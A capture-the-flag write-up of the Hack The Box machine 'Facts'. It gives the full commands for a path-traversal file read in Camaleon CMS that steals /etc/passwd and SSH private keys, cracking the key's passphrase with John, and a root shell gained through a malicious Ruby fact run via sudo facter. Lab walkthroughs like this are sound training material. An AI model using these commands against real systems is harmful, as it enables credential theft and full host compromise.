# Hack The Box – Facts: Attack Path Writeup

## Summary

The attack path for `Facts` was straightforward once the Camaleon CMS version and authenticated media functionality were reviewed. The target allowed user registration, which provided a low-privileged authenticated session in the Camaleon CMS admin panel. That session was enough to exploit an authenticated arbitrary file read vulnerability in the media download functionality.

The arbitrary file read exposed the `trivia` user’s SSH private key. The key was encrypted, but the passphrase was weak and crackable with John. After logging in as `trivia`, privilege escalation was achieved through a misconfigured `sudo` rule allowing passwordless execution of `/usr/bin/facter`. Facter supports loading custom Ruby facts, which allowed code execution as root.

---

## Enumeration

Initial enumeration identified the following relevant services:

```text
22/tcp     SSH
80/tcp     HTTP - nginx / Rails / Camaleon CMS
54321/tcp  MinIO / S3-compatible object storage
```

The host was added to `/etc/hosts`:

```bash
echo "10.129.244.96 facts.htb" | sudo tee -a /etc/hosts
```

The web application exposed a Camaleon CMS admin interface:

```text
http://facts.htb/admin
```

The application allowed user registration. After creating a low-privileged account and logging in, the admin interface showed Camaleon CMS version `2.9.0`.

The authenticated user had limited access. The visible admin functionality was mostly restricted to:

```text
/admin/dashboard
/admin/profile
/admin/profile/edit
/admin/search
```

Other administrative routes such as `/admin/media`, `/admin/plugins`, `/admin/comments`, and `/admin/users` redirected back to the dashboard. This indicated that the account was low-privileged, but still authenticated.

During enumeration, MinIO was also found on port `54321`. The `randomfacts` bucket was public and writable, and uploaded objects were exposed through:

```text
http://facts.htb/randomfacts/<object>
```

This was a valid misconfiguration, but it did not become the main path to shell or root. The intended path was through Camaleon CMS authenticated file disclosure.

---

## Foothold

### Authenticated Arbitrary File Read

Known Camaleon CMS media-related vulnerabilities were reviewed. The relevant endpoint was:

```text
/admin/media/download_private_file?file=
```

Using the authenticated session cookie, arbitrary local files could be read with path traversal.

The vulnerability was confirmed by reading `/etc/passwd`:

```bash
curl -i "http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd" \
-H "Cookie: $COOKIE"
```

The response confirmed local file disclosure:

```text
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
```

This identified two interactive users:

```text
trivia
william
```

### User Flag

The same arbitrary file read was used to read the user flag from `trivia`’s home directory:

```bash
curl -s "http://facts.htb/admin/media/download_private_file?file=../../../../../../home/trivia/user.txt" \
-H "Cookie: $COOKIE"
```

### SSH Key Disclosure

Next, the users’ SSH directories were checked through the same file read primitive:

```bash
for user in trivia william; do
  for f in id_rsa id_ed25519 authorized_keys config known_hosts; do
    echo "===== /home/$user/.ssh/$f ====="
    curl -s "http://facts.htb/admin/media/download_private_file?file=../../../../../../home/$user/.ssh/$f" \
    -H "Cookie: $COOKIE" | head -n 20
    echo
  done
done
```

The private SSH key for `trivia` was readable:

```text
/home/trivia/.ssh/id_ed25519
```

The key was saved locally:

```bash
curl -s "http://facts.htb/admin/media/download_private_file?file=../../../../../../home/trivia/.ssh/id_ed25519" \
-H "Cookie: $COOKIE" \
-o trivia_id_ed25519

chmod 600 trivia_id_ed25519
```

The key was encrypted, so it required a passphrase.

### Cracking the SSH Key

The private key was converted to a John-compatible hash:

```bash
ssh2john trivia_id_ed25519 > trivia_ssh.hash
```

If `ssh2john` was not available directly:

```bash
python3 /usr/share/john/ssh2john.py trivia_id_ed25519 > trivia_ssh.hash
```

The passphrase was cracked with `rockyou.txt`:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt trivia_ssh.hash
```

Recovered passphrase:

```text
dragonballz
```

SSH access was obtained as `trivia`:

```bash
ssh -i trivia_id_ed25519 trivia@facts.htb
```


After login:

```bash
whoami
hostname
pwd
```

Output:

```text
trivia
facts
/home/trivia
```

This established the foothold.

---

## Privilege Escalation

The first local privilege escalation check was `sudo -l`:

```bash
sudo -l
```

The result showed that `trivia` could run `/usr/bin/facter` as root without a password:

```text
User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

The Facter version was checked:

```bash
sudo /usr/bin/facter --version
```

Output:

```text
4.10.0
```

The help output confirmed support for custom fact directories:

```bash
sudo /usr/bin/facter --help | head -n 50
```

Relevant option:

```text
--custom-dir    A directory to use for custom facts.
```

Facter can load custom facts written in Ruby. Since it could be executed as root through `sudo`, a custom Ruby fact could be used to execute commands as root.

A malicious custom fact was created:

```bash
mkdir -p /tmp/facts

cat > /tmp/facts/root.rb <<'EOF'
Facter.add(:root_shell) do
  setcode do
    system("/bin/bash -p")
  end
end
EOF
```

The custom fact was executed through sudo:

```bash
sudo /usr/bin/facter --custom-dir /tmp/facts root_shell
```

This spawned a root shell:

```text
root@facts:/home/trivia#
```

Root access was confirmed:

```bash
id
whoami
```

The root flag was then read:

```bash
cat /root/root.txt
```

```text
a96ee6e11b8f9b4a2b5b76b0bb4be5fe
```

---

## TTP Connection

The attack chain connected several simple but high-impact weaknesses:

```text
User registration
→ low-privileged authenticated Camaleon CMS session
→ authenticated arbitrary file read
→ local user enumeration through /etc/passwd
→ user flag disclosure
→ SSH private key disclosure
→ weak SSH key passphrase cracked with John
→ SSH access as trivia
→ sudo misconfiguration for /usr/bin/facter
→ custom Ruby fact execution as root
→ root shell
```

The key transition was the authenticated file read. It transformed a low-privileged web account into access to local system files, including SSH material. The final privilege escalation was caused by unsafe passwordless sudo access to a binary capable of loading attacker-controlled Ruby code.

---

## Final Attack Path

```text
Register account on Camaleon CMS
→ authenticate to /admin
→ exploit /admin/media/download_private_file path traversal
→ read /etc/passwd
→ identify trivia
→ read /home/trivia/user.txt
→ read /home/trivia/.ssh/id_ed25519
→ crack key passphrase: dragonballz
→ SSH as trivia
→ sudo -l
→ abuse NOPASSWD /usr/bin/facter
→ load malicious Ruby custom fact
→ root shell
→ read /root/root.txt
```
